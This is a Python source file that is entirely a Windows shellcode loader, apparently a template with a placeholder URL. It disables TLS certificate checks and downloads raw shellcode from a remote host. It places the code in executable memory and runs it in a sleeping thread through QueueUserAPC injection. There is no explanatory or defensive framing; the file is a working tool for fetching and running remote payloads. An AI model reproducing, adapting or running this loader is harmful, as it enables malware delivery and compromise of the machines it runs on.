import ctypes
import ctypes.wintypes as wintypes
import threading
import ssl
import urllib.request
import time

try:
    ULONG_PTR = wintypes.ULONG_PTR
except AttributeError:
    if ctypes.sizeof(ctypes.c_void_p) == 8:
        ULONG_PTR = ctypes.c_uint64
    else:
        ULONG_PTR = ctypes.c_uint32

ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

url = "%%url%%"

with urllib.request.urlopen(url, context=ssl_context) as response:
    shellcode = response.read()

shellcode_size = len(shellcode)
shellcode_buffer = ctypes.create_string_buffer(shellcode, shellcode_size)

MEM_COMMIT  = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
kernel32.VirtualAlloc.argtypes = (ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32)
kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = kernel32.VirtualAlloc(None, ctypes.c_size_t(shellcode_size), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

if not ptr:
    raise MemoryError("Failed to allocate memory")

RtlMoveMemory = ctypes.cdll.msvcrt.memmove
RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
RtlMoveMemory.restype  = None
RtlMoveMemory(ctypes.c_void_p(ptr), ctypes.byref(shellcode_buffer), ctypes.c_size_t(shellcode_size))

def sleeper():
    kernel32.SleepEx(0xFFFFFFFF, True)

sleeper_thread = threading.Thread(target=sleeper, daemon=True)
sleeper_thread.start()

time.sleep(0.5)

OpenThread = kernel32.OpenThread
OpenThread.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenThread.restype  = wintypes.HANDLE

THREAD_ALL_ACCESS = 0x1F03FF
thread_handle = OpenThread(THREAD_ALL_ACCESS, False, sleeper_thread.ident)
if not thread_handle:
    raise OSError("Failed to open thread")

QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes = (ctypes.c_void_p, wintypes.HANDLE, ULONG_PTR)
QueueUserAPC.restype  = wintypes.ULONG

result = QueueUserAPC(ctypes.c_void_p(ptr), thread_handle, 0)
if result == 0:
    raise OSError("QueueUserAPC failed.")

print("APC queued")
while True:
    time.sleep(1)
